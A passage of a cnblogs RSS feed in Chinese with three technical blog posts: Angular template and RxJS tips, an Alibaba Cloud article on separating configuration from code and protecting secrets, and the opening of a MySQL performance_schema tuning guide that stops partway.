&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
下面会介绍一些Angular开发中的技巧
&lt;/pre&gt;&lt;/div&gt;
&lt;ol readability=&quot;19.5&quot;&gt;&lt;li readability=&quot;5.5&quot;&gt;
&lt;p&gt;使用模板语言  &lt;span class=&quot;cnblogs_code&quot;&gt;as&lt;/span&gt;  , 使用 as 对一些嵌套结构深的属性进行重命名&lt;br/&gt;改进前：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
&amp;lt;div *ngFor=&quot;let queue of fileUploadQueues&quot;&amp;gt;
    &amp;lt;div class=&quot;icon&quot; *ngIf=&quot;queue.result.file.icon&quot;&amp;gt;{{ queue.result.file.icon }}&amp;lt;/div&amp;gt;
    &amp;lt;div class=&quot;name&quot; *ngIf=&quot;queue.result.file.name&quot;&amp;gt;{{ queue.result.file.name }}&amp;lt;/div&amp;gt;
    &amp;lt;div class=&quot;size&quot; *ngIf=&quot;queue.result.file.size&quot;&amp;gt;{{ queue.result.file.size }}&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;改进后：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
&amp;lt;div *ngFor=&quot;let queue of fileUploadQueues&quot;&amp;gt;
  &amp;lt;ng-container *ngIf=&quot;queue.result.file as file&quot;&amp;gt;
       &amp;lt;div class=&quot;icon&quot; *ngIf=&quot;file.icon&quot;&amp;gt;{{ file.icon }}&amp;lt;/div&amp;gt;
       &amp;lt;div class=&quot;name&quot; *ngIf=&quot;file.name&quot;&amp;gt;{{ file.name }}&amp;lt;/div&amp;gt;
       &amp;lt;div class=&quot;size&quot; *ngIf=&quot;file.size&quot;&amp;gt;{{ file.size }}&amp;lt;/div&amp;gt;
  &amp;lt;/ng-container&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li readability=&quot;8&quot;&gt;
&lt;p&gt;灵活使用  &lt;span class=&quot;cnblogs_code&quot;&gt;*ngIfElse&lt;/span&gt; ，很多人其实一直在写 &lt;span class=&quot;cnblogs_code&quot;&gt;*ngIf&lt;/span&gt;  并不知道其实Angular支持  &lt;span class=&quot;cnblogs_code&quot;&gt;else&lt;/span&gt;  的写法  &lt;span class=&quot;cnblogs_code&quot;&gt;*ngIf=&quot;条件 ; else 模板&quot;&lt;/span&gt; ，看看下面这两段代码&lt;/p&gt;
&lt;p&gt;改进前：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
&amp;lt;div *ngIf=&quot;(data$ | async).length &amp;gt; 0&quot;&amp;gt;
   ...
&amp;lt;/div&amp;gt;
&amp;lt;div *ngIf=&quot;!(data$ | async).length &amp;gt; 0&quot;&amp;gt;
   没有数据
&amp;lt;/div&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;改进后：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
&amp;lt;div *ngIf=&quot;(data$ | async).length &amp;gt; 0; else emptyTemplate;&quot;&amp;gt;
   ...
&amp;lt;/div&amp;gt;
&amp;lt;ng-template  #emptyTemplate&amp;gt;
   没有数据
&amp;lt;/ng-template&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;改进前的写法，也能实现同样的效果，但是因为数据是通过 &lt;span class=&quot;cnblogs_code&quot;&gt;async&lt;/span&gt;  订阅的，第一种写法相当于进行了两次订阅，当然也可以用 as 来解决，这里只是一个示例。&lt;br/&gt;还有一种情况，在条件多的时候，通过第一种方式写的话，如果条件有修改的话，必须要对取反后的条件进行维护， 而用  &lt;span class=&quot;cnblogs_code&quot;&gt;ngIfElse&lt;/span&gt;  的方式则只需要进行一次维护。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0.5&quot;&gt;
&lt;p&gt;使用  &lt;span class=&quot;cnblogs_code&quot;&gt;ng-container&lt;/span&gt;  对代码进行整理，使代码更清晰，提升代码的可读性&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
&amp;lt;ng-container *ngIf=&quot;type === 1&quot;&amp;gt;
   ...
&amp;lt;/ng-container&amp;gt;
&amp;lt;ng-container *ngIf=&quot;type === 2&quot;&amp;gt;
   ...
&amp;lt;/ng-container&amp;gt;
&amp;lt;ng-container *ngIf=&quot;type === 3&quot;&amp;gt;
   ...
&amp;lt;/ng-container&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li readability=&quot;4.5&quot;&gt;
&lt;p&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;@ViewChild&lt;/span&gt;  读取指定类型的实例&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
&amp;lt;input #input thyInput  [thyAutofocus]=&quot;true&quot; /&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面这行代码有三个实例  &lt;span class=&quot;cnblogs_code&quot;&gt;ElementRef&lt;/span&gt;  、 &lt;span class=&quot;cnblogs_code&quot;&gt;ThyInputComponent&lt;/span&gt; 、 &lt;span class=&quot;cnblogs_code&quot;&gt;ThyAutoFocusDirective&lt;/span&gt; ，在某些情况下如果我们要获取指定类型的实例应该怎么做呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
@ViewChild('input', { read:ThyInputComponent })  inputComponent : ThyInputComponent ;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li readability=&quot;6.5&quot;&gt;
&lt;p&gt;使用  &lt;span class=&quot;cnblogs_code&quot;&gt;async&lt;/span&gt;  管道，直接在模板中订阅流，而不必将结果存储在中间属性中，当组件被销毁时，Angular将会自动取消订阅。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
&amp;lt;div *ngFor=&quot;let item of data$ | async&quot;&amp;gt;
   ...
&amp;lt;/div&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在一些情况下，我们可能需要重复使用订阅的数据，但是我们又不能每次使用的时候都用  &lt;span class=&quot;cnblogs_code&quot;&gt;async&lt;/span&gt;  去订阅，所以我们可以通过刚才说的  &lt;span class=&quot;cnblogs_code&quot;&gt;as&lt;/span&gt;  对齐进行重命名。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
&amp;lt;div *ngFor=&quot;let item of data$ | async as data&quot;&amp;gt;
   &amp;lt;span&amp;gt;一共有{{data.length}}条数据&amp;lt;/span&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;使用  &lt;span class=&quot;cnblogs_code&quot;&gt;takeUntil&lt;/span&gt;  来管理订阅&lt;br/&gt;在某些复杂的业务中，我们可能需要订阅多个流，一个一个去取消订阅又繁琐，又会产生很多冗余代码，不利于代码的维护。这时候我们可以 &lt;span class=&quot;cnblogs_code&quot;&gt;takeUntil&lt;/span&gt;  来管理多个订阅，统一取消订阅。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
private _ngUnsubscribe$ = new Subject();

ngOnInit() {
 this.students$.pipe(
    takeUntil(_ngUnsubscribe$)
 ).subscribe(() =&amp;gt; {
         ...
 });
 this.books$.pipe(
    takeUntil(_ngUnsubscribe$)
 ).subscribe(() =&amp;gt; {
         ...
 });
}
ngOnDestroy() {
  this._ngUnsubscribe$.next();
  this._ngUnsubscribe$.complete();
}
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li readability=&quot;9&quot;&gt;
&lt;p&gt;合理使用 ngZone  &lt;span class=&quot;cnblogs_code&quot;&gt;runOutsideAngular&lt;/span&gt;  来提升应用性能&lt;br/&gt;我们知道Angular可以自动处理变化检测，这是因为它使用了  &lt;span class=&quot;cnblogs_code&quot;&gt;zone.js&lt;/span&gt;  ，简单的来说， &lt;span class=&quot;cnblogs_code&quot;&gt;zone.js&lt;/span&gt;  就是通过打补丁的方式来拦截浏览器的事件，然后进行变化检测，但是变化检测是极其消耗资源的，如果绑定了大量的事件，那么就会造成性能问题，所以我们可以使用  &lt;span class=&quot;cnblogs_code&quot;&gt;runOutsideAngular&lt;/span&gt;  来减少不必要的变化检测。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
this.ngZone.runOutsideAngular(() =&amp;gt; {
   this.renderer.listen(this.elementRef.nativeElement, 'keydown', event =&amp;gt; {
      const keyCode = event.which || event.keyCode;
         if (keyCode === keycodes.ENTER) {
              event.preventDefault();
              this.ngZone.run(() =&amp;gt; {
                  this.thyEnter.emit(event);
              });
         }
   });
});
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面这段代码是绑定一个回车事件，如果不使用  &lt;span class=&quot;cnblogs_code&quot;&gt;runOutsideAngular&lt;/span&gt;  的话，只要触发键盘输入事件，就会执行变化检测，这时候我们可以用  &lt;span class=&quot;cnblogs_code&quot;&gt;runOutsideAngular&lt;/span&gt;  在只有为enter事件的时候，去调用  &lt;span class=&quot;cnblogs_code&quot;&gt;ngZone.run()&lt;/span&gt;  主动触发变化检测&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;5.5&quot;&gt;
&lt;p&gt;灵活使用  &lt;span class=&quot;cnblogs_code&quot;&gt;ngTemplateOutlet&lt;/span&gt;  来实现递归&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
&amp;lt;ng-container *ngFor=&quot;let node of treeNodes;&quot; [ngTemplateOutlet]=&quot;nodeTemplate&quot; 
         [ngTemplateOutletContext]=&quot;{node: node}&quot;&amp;gt;
&amp;lt;/ng-container&amp;gt;

&amp;lt;ng-template #nodeTemplate let-node=&quot;node&quot;&amp;gt;
     &amp;lt;div class='title'&amp;gt;{{node.title}}&amp;lt;/div&amp;gt;
      &amp;lt;ng-container *ngFor=&quot;let child of node?.children;&quot;  [ngTemplateOutlet]=&quot;nodeTemplate&quot;
                     [ngTemplateOutletContext]=&quot;{node: child}&quot;&amp;gt;
       &amp;lt;/ng-container&amp;gt;
&amp;lt;/ng-template&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在我们实际开发的过程中，经常会展示一些树形结构的数据，如果业务场景比较简单，可以通过Angular的  &lt;span class=&quot;cnblogs_code&quot;&gt;ngTemplateOutlet&lt;/span&gt;  来实现递归展示，如果业务复杂，建议还是通过组件的方式来实现。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h4 id=&quot;-&quot;&gt;写在最后&lt;/h4&gt;
&lt;p&gt;上面是我这一年Angular开发的过程中积累的一些小技巧（可能还有没想起来的，我想起来会慢慢的往上补），大家如果发现有错误的地方，请指正。其实去年就写好这篇文章，但是总感觉缺点什么，不过无所谓了~~ 希望能给Angular学习者提供帮助~&lt;/p&gt;

&lt;p&gt;本文作者：王凯&lt;/p&gt;
&lt;p&gt;文章来源：&lt;a href=&quot;https://worktile.com/blog/tech?utm_medium=meiyang&quot; target=&quot;_blank&quot;&gt;Worktile技术博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;欢迎访问交流更多关于技术及协作的问题。&lt;/p&gt;
&lt;p&gt;文章转载请注明出处。&lt;/p&gt;
</description>
<pubDate>Thu, 07 Mar 2019 07:06:00 +0000</pubDate>
<dc:creator>Worktile</dc:creator>
<og:description>工具篇 抛弃 资源管理器 ，使用快捷键 Commd + P 来查找文档，默认会展示最近打开的文档，并且支持模糊搜索文件 快速打开最近文档：前进 Ctrl+➕ 后退 Ctrl+➖ 灵活使用VS</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/worktile/p/10489745.html</dc:identifier>
</item>
<item>
<title>程序员如何让自己 Be Cloud Native - 配置篇 - 阿里云云栖社区</title>
<link>http://www.cnblogs.com/yunqishequ/p/10489704.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yunqishequ/p/10489704.html</guid>
<description>&lt;h2 id=&quot;1&quot; data-spm-anchor-id=&quot;a2c4e.11153940.blogcont691761.i0.7fd37233tHvBV2&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;这是《程序员如何让自己 Be Cloud Native》系列文章的第二篇，从第一篇的反馈来看，有些同学反馈十二要素太形式主义，不建议盲目跟从。作者认为任何理论和技术都需要有自己的观点，这些观点是建立在个体知识体系逐渐锻炼出来的辩别能力之上的。Be Cloud Native这一系列的文章，会基于十二要素为理论基础，加上作者在云计算诞生以来对于架构的演进所观察到的变化去分享自己的一些心得。&lt;/p&gt;
&lt;p&gt;第一篇：仓库与依赖。「传送门」&lt;/p&gt;
&lt;h2 id=&quot;2&quot;&gt;实例&lt;/h2&gt;
&lt;p&gt;配置这个要素的核心思想就是代码与数据隔离，一开始我们的软件很小很小的时候，我们会可能直接把各种配置、甚至生产环境中的代码直接写在代码中，配置甚至就是代码的一部分？比如以下的这断代码就是这样：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs java&quot;&gt; 
&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;boolean &lt;span class=&quot;hljs-title&quot;&gt;serviceConnectable&lt;span class=&quot;hljs-params&quot;&gt;() {
  &lt;span class=&quot;hljs-keyword&quot;&gt;return ping(&lt;span class=&quot;hljs-string&quot;&gt;&quot;edas.console.aliyun.com&quot;, &lt;span class=&quot;hljs-number&quot;&gt;3);
  }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;该方法实现一个本地是否可以连接到远端 server 的功能。如果按照上面的代码进行编写，只能保证在公共云的环境达到想要的效果。该程序如果部署到了一个专有云或者 IDC 的环境中的时候，就需要改代码了。&lt;/p&gt;
&lt;p&gt;如果改成以下的方式，效果就会截然不同。那时如果程序部署到了一套新的环境中，只需改变&lt;code&gt;edas.server.address&lt;/code&gt; 这个配置。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs java&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Value(&lt;span class=&quot;hljs-string&quot;&gt;&quot;edas.server.address&quot;)
&lt;span class=&quot;hljs-keyword&quot;&gt;private String remoteAddress;

&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;boolean &lt;span class=&quot;hljs-title&quot;&gt;serviceConnectable&lt;span class=&quot;hljs-params&quot;&gt;() {
&lt;span class=&quot;hljs-keyword&quot;&gt;return ping(remoteAddress, &lt;span class=&quot;hljs-number&quot;&gt;3);

}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;3&quot;&gt;定义与示例&lt;/h2&gt;
&lt;p&gt;这个例子应该比较贴近大家的日常，我们将上面这个例子往上提升一层，可以做出一个如下的初步定义：应用的行为(_Behavior_) = 代码(_Code_) + 输入(_Data_)。代码是固定的，需要重新编译分发，无法根据环境进行变化的；而输入是活的。上面的例子，就是一个把 Code 中的一部分内容抽离，变成 Data 的过程。做完这个变化之后，应用对变化的适应性就更强了。当然，这些 Data 有些是用户输入的，有些是系统启动时就已经确定的，后者是我们定义的 &lt;code&gt;配置&lt;/code&gt; ，也是我们今天讨论的主题。从这个层面(_Data_)说起来，配置其实可以包含很多种，以 Java 语言为例，至少分为以下几种：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;代码中的文件配置: *.properties 文件。&lt;/li&gt;
&lt;li&gt;机器上的文件配置 *.properties 文件。&lt;/li&gt;
&lt;li&gt;通过 -D 参数指定的启动参数。&lt;/li&gt;
&lt;li&gt;环境变量。&lt;/li&gt;
&lt;li&gt;配置管理系统，简单的有 DB；比较流行的领域产品如 Nacos、ZooKeeper、ectd 等。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;选择多了，貌似世界就不那么美妙了，因为我们总是会陷入到“用什么”和“为什么”中去。作者的观点是，在用什么之前，先弄清楚需求层面的两点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;隔离粒度：每个版本不一样？每台机器不一样？每个进程不一样？&lt;/li&gt;
&lt;li&gt;安全性：运维人员可见？开发人员可见？还是都不应该可见？&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;仔细讨论上述两点之前，我们举几个关于配置的例子：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;程序版本号：从代码 Release (build) 开始，基本上就确定了；这一类配置基本上不存在变化的可能，即这一类配置的隔离粒度等同于 Code 。&lt;/li&gt;
&lt;li&gt;某个前端组件的版本号：前端版本号有一个特点，就是变动很频繁，尤其是在上线的过程中，发布三四个版本是很常见的现象；而且在上线的过程中，一般都会先灰度验证，再进行现网发布。所以这类配置需要具备一个特点就是，可灵活变动与可按照环境（不同机器、不同流量）粒度发布。&lt;/li&gt;
&lt;li&gt;服务器端口号：服务器的端口号是需要和进程绑定的，尤其在某些微服务场景；同一个服务，如果部署在同一台机器上，必须准确的告知其他服务本服务的确切的地址和端口。&lt;/li&gt;
&lt;li&gt;数据库元信息配置：这种配置，同一套环境中的相同服务会是一样的，而且其真实的值隐藏的越深越好，其他还有某些 AK/SK、用户名密码之类，每套环境会不一样，同时不同的产品对待这类配置的安全性要求也可能不一样。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;4&quot;&gt;归纳&lt;/h2&gt;
&lt;p&gt;通过上面例子简单的论述，我们大致可以把相关的配置做如下的归类：&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;配置项所在位置&lt;/th&gt;
&lt;th&gt;隔离性&lt;/th&gt;
&lt;th&gt;安全性&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;8&quot;&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td align=&quot;left&quot;&gt;代码文件&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;控制不同版本的软件行为，等同于代码、基本不会改动&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;所有有代码权限的人员都可见&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td align=&quot;left&quot;&gt;机器上的文件&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;机器环境级别的隔离&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;可根据文件的系统权限灵活设置可见性&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;启动参数&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;进程级别隔离&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;能进入系统便可见&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td align=&quot;left&quot;&gt;环境变量&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;可根据容器、系统、用户、进程进行非常灵活的搭配&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;可设置到系统用户级别&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td align=&quot;left&quot;&gt;配置管理系统&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;程序员可自由编程实现，一般是服务级别的隔离性&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;取决于不同产品的实现，有的方案可以做到安全性最好&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;这里作者想额外强调的是安全性这一个点，尤其某些金融场景。原生的配置方式，如果不做代码的改动的话，都无法做到很高的安全性，但是在一些分布式产品中，尤其是一些云产品内部，就可以做到很安全，具体可以参考下图：&lt;br/&gt;&lt;img title=&quot;1&quot; src=&quot;https://yqfile.alicdn.com/d2171d9924e7fc377adacdf26e39c561b7697058.png&quot; alt=&quot;1&quot;/&gt;&lt;/p&gt;
&lt;p&gt;以 Nacos 的云上实现 ACM 为例，对上图进行一个简单的阐述。一般的程序读取配置方式如左图，当执行启动脚本后，应用程序从脚本中设置的环境变量、文件或启动参数中获取配置。这些方式可以满足大部分的场景，但是如果你的应用是一个分布式的大集群，这个时候如果想改一个配置是不可能在机器上配置的，然后一台台的区修改，此时我们需要一个支持大集群的分布式配置服务来支持。开源的配置中心有很多，如 ZooKeeper、etcd、Nacos 等。&lt;/p&gt;
&lt;p&gt;但是有一种场景，一般意义上的配置中心也是满足不了的，那就是诸如数据库密码这一类安全性要求很高的配置。这类在云上会有一些很好的实现，以上图右边为例解释一下在云上是如何做到的：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;当用户往配置服务中写入一个配置时，会先使用加密服务进行加密，图中的 A。&lt;/li&gt;
&lt;li&gt;如果有客户端需要，将相应的加密数据推往对应的客户端，图中的 B。&lt;/li&gt;
&lt;li&gt;客户端收到数据，会根据机器上的_云角色_，请求云加密服务进行解密，图中的 C。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;从上面这个描述，我们就能很感受到整个过程，利用云生态的能力，可以做得很优雅、很安全，而且也没有额外的代码侵入。&lt;/p&gt;
&lt;h2 id=&quot;5&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;写到这里，我需要点一下题，要做到 “Be Cloud Native” ，配置是必不可少的一个环节。能让我们的世界变得稍微美好点的方式之一，就是把每个硬编码的字符，变成一个个可运维、安全的配置。&lt;/p&gt;
&lt;p&gt;同时在云上，我们会看到有不一样的、更加优雅、更安全、成本更低的解决方案。配置的安全无小事，一时图简单省事，可能就会造成生产级别的敏感信息、甚至 DB 的泄露。&lt;/p&gt;
&lt;p data-spm-anchor-id=&quot;a2c4e.11153940.blogcont691761.i1.7fd37233tHvBV2&quot;&gt;Be Cloud Native 的另外一层意思，正是尽可能多的利用云厂商提供的原生技术能力，来构建一个更安全、优雅、可扩展、高可用的应用架构。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://yq.aliyun.com/articles/691761?utm_content=g_1000045304&quot; target=&quot;_blank&quot;&gt;原文链接&lt;/a&gt;&lt;br/&gt;本文为云栖社区原创内容，未经允许不得转载。&lt;/p&gt;
</description>
<pubDate>Thu, 07 Mar 2019 07:02:00 +0000</pubDate>
<dc:creator>阿里云云栖社区</dc:creator>
<og:description>前言 这是《程序员如何让自己 Be Cloud Native》系列文章的第二篇，从第一篇的反馈来看，有些同学反馈十二要素太形式主义，不建议盲目跟从。作者认为任何理论和技术都需要有自己的观点，这些观点是</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yunqishequ/p/10489704.html</dc:identifier>
</item>
<item>
<title>mysql之调优概论 - 无为有道</title>
<link>http://www.cnblogs.com/ck0074451665/p/10489649.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ck0074451665/p/10489649.html</guid>
<description>
&lt;p&gt;&lt;span&gt;&lt;strong&gt;一  简介&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　咱们先不说cpu的频率，内存的大小（这个和索引一样重要，但不是本文讨论的内容），硬盘的寻道时间。想起mysql的调优，最起码的必须知道explain执行计划，慢sql日志，老旧的profile命令，新的performance_schema性能视图和information_schema中当前事务和内存占用信息的相关表，还有 show engine innodb status的诊断信息，以及某些metrix中的tps，qps,iops的指标。&lt;/p&gt;
&lt;p&gt;　　以上是为调优准备的一些工具，而数据库都会为高可用提供很多大大小小的功能，大的有：复制，组复制，分区，文件链接：即log日志与数据文件等可分别放置不同硬盘。小的有：计算列，为列计算hash，索引合并，索引下推，MRR，BKA,Loose Index 等算法，以及填充因子等。&lt;/p&gt;
&lt;p&gt;　　当然，没有视图索引和分布式分区视图，以及join仅仅只支持nested这是mysql的不足，而sql server join的算法支持三种，loop while hash，极大的改善join的速度。mysql自带提升性能的功能并不多&lt;/p&gt;
&lt;p&gt;，其他的就是经验之谈，比如静态表，不要在子查询中使用函数，尽量将子查询变为join查询，非字符串和blob列永远比其他的数字或者时间列要慢，join |order by|group一定不要让其在硬盘生成临时表，当然这个和内存有关，窄表和宽表设计等，当然最后还是取决你的业务类型。&lt;/p&gt;
&lt;p&gt;　　优化入手有两种方法，一种是运行时的，即在运行的服务器上优化，一种是开发过程中。而无论哪种，performance_schema都会需要。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;二 performance_schema讲解&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　性能视图是每个数据库中都会有的，sql server是dm_*开头的一系列内存表。而mysql就是&lt;strong&gt;performance_schema&lt;/strong&gt;库中的各种表，先看入口的几个表：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;SELECT&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;FROM&lt;/span&gt; setup_timers; &lt;span&gt;--&lt;/span&gt;&lt;span&gt; 计时定义表&lt;/span&gt;
&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; setup_actors; &lt;span&gt;--&lt;/span&gt;&lt;span&gt; 那些用户需要收集信息&lt;/span&gt;
&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; Setup_objects; &lt;span&gt;--&lt;/span&gt;&lt;span&gt; 那些对象需要收集信息，比如mysql表，&lt;/span&gt;
&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; setup_consumers; &lt;span&gt;--&lt;/span&gt;&lt;span&gt; 那些仪器的分类需要收集&lt;/span&gt;
&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; setup_instruments; &lt;span&gt;--&lt;/span&gt;&lt;span&gt; 收集仪器，每一个功能点都会有仪器的事件，开始和结束，然后开启那个仪器，就会收集那个仪器的数据&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;首先我们看开启performance_schema的开关：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
show variables &lt;span&gt;like&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;performance_schema&lt;/span&gt;&lt;span&gt;' -- 这是一个read only变量&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/46403/201903/46403-20190307132520328-1228782857.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果为OFF，则需要在配置文件中开启。&lt;/p&gt;
&lt;p&gt;那么下面就一个一个介绍这几个入口表。&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;1 ，&lt;/span&gt;&lt;strong&gt;setup_actors表&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/46403/201903/46403-20190307132915433-894450898.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　全部用户都可收集。&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;2&lt;/span&gt;，&lt;strong&gt;Setup_objects&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/46403/201903/46403-20190307133322766-107005825.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　那些对象可以收集，是table还是trigger等。&lt;span&gt;至于关闭两个列控制，enabled和timed字段设置为No，这几个表都是如此。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;3  &lt;/span&gt;&lt;strong&gt;setup_consumers&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/46403/201903/46403-20190307133600550-104118412.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
